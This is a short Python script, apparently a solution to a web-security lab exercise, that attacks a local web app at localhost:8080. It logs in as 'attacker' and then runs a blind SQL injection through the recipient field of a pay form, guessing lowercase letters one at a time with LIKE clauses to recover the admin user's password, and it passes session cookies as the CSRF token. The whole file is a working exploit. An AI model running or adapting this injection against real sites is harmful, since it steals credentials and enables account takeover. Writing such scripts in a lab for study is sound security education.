from requests import codes, Session
from string import ascii_lowercase

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount,cookie):
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "CSRF_token":cookie,
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    password=""
    found = False
    while found==False:
        for x in ascii_lowercase:
            injection=password+x+"%"
            if submit_pay_form(sess,username+"' AND users.password LIKE '"+injection,0,sess.cookies.values()):
                password=password+x
                if submit_pay_form(sess,username+"' AND users.password = '"+password,0,sess.cookies.values()):
                    found = True
                break
    print(username+"'s password is: "+password)
    return password

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
